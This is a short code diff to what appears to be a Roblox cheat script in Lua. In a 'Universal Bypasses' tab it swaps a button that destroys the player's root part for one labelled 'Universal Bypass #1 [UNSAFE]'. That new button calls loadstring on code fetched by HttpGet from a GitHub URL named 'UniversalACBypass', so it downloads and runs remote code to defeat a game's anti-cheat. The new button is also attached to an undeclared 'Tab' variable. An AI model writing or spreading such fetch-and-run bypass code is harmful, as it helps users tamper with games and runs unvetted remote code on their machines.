@@ -202,9 +202,9 @@ local ClickToTpButton = Uni:CreateButton({
 
 local BY = Gyro:CreateTab("Universal Bypasses", "apple")
 
-local Button = BY:CreateButton({
-	Name = "RROOT",
+local Button = Tab:CreateButton({
+	Name = "Universal Bypass #1 [UNSAFE]",
 	Callback = function()
-	character.HumanoidRootPart:Destory()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Next1x/Nextix./main/UniversalACBypass"))()
 	end,
  })
